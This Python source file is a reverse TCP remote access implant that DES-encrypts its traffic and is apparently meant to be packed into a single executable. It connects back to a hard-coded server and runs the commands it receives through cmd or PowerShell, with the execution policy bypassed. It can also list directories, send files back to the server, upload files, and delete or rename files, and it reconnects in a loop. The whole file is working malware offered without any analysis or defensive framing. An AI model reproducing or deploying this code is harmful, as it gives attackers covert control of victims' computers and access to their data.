# pyinstaller --onefile ReverseTCP_DES.py

import socket
import subprocess
import base64
from Crypto.Cipher import DES
import os
import struct
import time
import json
from datetime import datetime

def recv_all(sock, n):
    data = b''
    while len(data) < n:
        part = sock.recv(n - len(data))
        if not part:
            raise ConnectionError("Connection closed while receiving data")
        data += part
    return data


def recv_data(sock):
    raw_msglen = recv_all(sock, 4)
    if not raw_msglen:
        return b''
    msglen = struct.unpack('>I', raw_msglen)[0]
    return recv_all(sock, msglen)


def send_data(sock, data_bytes):
    if isinstance(data_bytes, str):
        data_bytes = data_bytes.encode('utf-8', errors='replace')
    length = len(data_bytes)
    sock.sendall(length.to_bytes(4, 'big') + data_bytes)


status_base64 = True
b64encode = base64.urlsafe_b64encode if status_base64 else base64.b64encode
b64decode = base64.urlsafe_b64decode if status_base64 else base64.b64decode


class DESCipher:
    def __init__(self, key):
        self.key = key
        self.block_size = DES.block_size

    def _pad(self, data):
        pad_len = self.block_size - len(data) % self.block_size
        return data + bytes([pad_len]) * pad_len

    def _unpad(self, data):
        return data[:-data[-1]]

    def encrypt(self, raw_data):
        if isinstance(raw_data, str):
            raw_data = raw_data.encode('utf-8', errors='replace')
        raw_data = self._pad(raw_data)
        iv = os.urandom(8)
        cipher = DES.new(self.key, DES.MODE_CBC, iv)
        encrypted = cipher.encrypt(raw_data)
        return b64encode(iv + encrypted)

    def decrypt(self, enc_data):
        try:
            enc_data = b64decode(enc_data)
            iv = enc_data[:8]
            encrypted = enc_data[8:]
            cipher = DES.new(self.key, DES.MODE_CBC, iv)
            decrypted = cipher.decrypt(encrypted)
            return self._unpad(decrypted).decode('utf-8', errors='replace')
        except Exception:
            return ""


def run_cmd_command(cmd):
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        output = result.stdout + result.stderr
        if result.returncode != 0:
            output += f"\n[Exit Code: {result.returncode}]"
        return output.strip() if output.strip() else "[+] Command executed (no output)"
    except subprocess.TimeoutExpired:
        return "[-] Command timed out after 90 seconds"
    except Exception as e:
        return f"[-] CMD execution error: {str(e)}"


def run_powershell_command(ps_cmd):
    try:
        result = subprocess.run(
            [
                "powershell.exe",
                "-NoProfile",
                "-ExecutionPolicy", "Bypass",
                "-Command",
                ps_cmd
            ],
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        output = result.stdout + result.stderr
        if result.returncode != 0:
            output += f"\n[Exit Code: {result.returncode}]"
        return output.strip() if output.strip() else "[+] PowerShell command executed (no output)"
    except subprocess.TimeoutExpired:
        return "[-] PowerShell command timed out after 120 seconds"
    except Exception as e:
        return f"[-] PowerShell execution error: {str(e)}"


def browse_directory(path):
    try:
        if path.startswith('~'):
            path = os.path.expanduser(path)     
        if not os.path.exists(path):
            return {'success': False,'error': f"Path does not exist: {path}",'current_path': path,'parent_path': None,'items': []}
        items = []
        try:
            entries = os.listdir(path)
        except PermissionError:
            return {'success': False,'error': f"Permission denied to access {path}",'current_path': path,'parent_path': None,'items': []}
        
        for item in entries:
            item_path = os.path.join(path, item)
            try:
                stat = os.stat(item_path)
                is_dir = os.path.isdir(item_path)
                modified_timestamp = stat.st_mtime
                modified_time = datetime.fromtimestamp(modified_timestamp).strftime('%Y-%m-%d %H:%M:%S')
                size_bytes = stat.st_size if not is_dir else 0    
                items.append({'name': item,'type': 'directory' if is_dir else 'file','size': size_bytes,'modified_time': modified_time})
            except (PermissionError, OSError):
                continue
        items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
        parent_path = os.path.dirname(path)
        if path.endswith(':\\') or path == '/':
            parent_path = None
        elif parent_path == path:
            parent_path = None
        return {'success': True,'current_path': path,'parent_path': parent_path,'items': items}
    except Exception as e:
        return {'success': False,'error': str(e),'current_path': path,'parent_path': None,'items': []}

def download_file(filepath):
    try:
        if not os.path.exists(filepath):
            return f"ERROR: File not found: {filepath}"
        
        filesize = os.path.getsize(filepath)
        filename = os.path.basename(filepath)
        
        with open(filepath, 'rb') as f:
            file_data = f.read()
        
        file_data_b64 = base64.b64encode(file_data).decode('ascii')
        
        return f"file-data:{filename}|{filesize}|{file_data_b64}"
        
    except Exception as e:
        return f"ERROR: {str(e)}"

def upload_file(filepath, filedata_b64):
    try:
        file_data = base64.b64decode(filedata_b64)
        
        directory = os.path.dirname(filepath)
        if directory and not os.path.exists(directory):
            os.makedirs(directory)
        
        with open(filepath, 'wb') as f:
            f.write(file_data)
        
        return f"SUCCESS: File uploaded to {filepath}"
        
    except Exception as e:
        return f"ERROR: {str(e)}"

def delete_file(filepath):
    try:
        if os.path.isdir(filepath):
            os.rmdir(filepath)
        else:
            os.remove(filepath)
        return f"SUCCESS: Deleted {filepath}"
    except Exception as e:
        return f"ERROR: {str(e)}"

def rename_file(old_path, new_path):
    try:
        os.rename(old_path, new_path)
        return f"SUCCESS: Renamed to {new_path}"
    except Exception as e:
        return f"ERROR: {str(e)}"


def execute_command(cmd: str) -> bytes:
    cmd = (cmd or "").strip()
    if not cmd:
        return b"[no command received]"

    if cmd.startswith("browse:"):
        browse_path = cmd[7:].strip()
        if not browse_path:
            browse_path = os.getcwd()
        dir_data = browse_directory(browse_path)
        json_str = json.dumps(dir_data, ensure_ascii=False)
        base64_data = base64.b64encode(json_str.encode('utf-8')).decode('ascii')
        return f"browse-data-{base64_data}".encode('utf-8')
    
    if cmd.startswith("download-file:"):
        filepath = cmd[14:].strip()
        result = download_file(filepath)
        return result.encode('utf-8')
    
    if cmd.startswith("upload-file:"):
        parts = cmd[12:].split('|', 1)
        if len(parts) == 2:
            filepath, filedata_b64 = parts
            result = upload_file(filepath, filedata_b64)
            return result.encode('utf-8')
        else:
            return b"ERROR: Invalid upload format"
    
    if cmd.startswith("delete-file:"):
        filepath = cmd[12:].strip()
        result = delete_file(filepath)
        return result.encode('utf-8')
    
    if cmd.startswith("rename-file:"):
        parts = cmd[12:].split('|', 1)
        if len(parts) == 2:
            old_path, new_path = parts
            result = rename_file(old_path, new_path)
            return result.encode('utf-8')
        else:
            return b"ERROR: Invalid rename format"


    upper_cmd = cmd.upper()
    if upper_cmd.startswith("EP "):
        ps_command = cmd[3:].strip()
        result_str = run_powershell_command(ps_command)
    elif upper_cmd.startswith("EP"):
        ps_command = cmd[2:].strip()
        result_str = run_powershell_command(ps_command)
    else:
        result_str = run_cmd_command(cmd)

    return result_str.encode('utf-8', errors='replace')



server_ip = "192.168.1.107"
server_port = 1111
key = b"12345678"
cipher = DESCipher(key)
auth_id = "b7a68104-9a1d-4c02-890c-d6458e4a5e5d"

while True:
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((server_ip, server_port))

        encrypted_auth = cipher.encrypt(auth_id)
        send_data(sock, encrypted_auth)

        while True:
            enc_command = recv_data(sock)
            if not enc_command:
                break

            command = cipher.decrypt(enc_command)
            if not command:
                continue

            command = command.strip()

            if command.lower() in ["exit", "quit"]:
                break

            if command.lower() == "ping":
                pong_enc = cipher.encrypt("pong")
                send_data(sock, pong_enc)
                continue

            output_bytes = execute_command(command)
            if not output_bytes:
                output_bytes = b"[no output]"

            encrypted_output = cipher.encrypt(output_bytes)
            send_data(sock, encrypted_output)

    except Exception:
        pass
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass
        time.sleep(5)
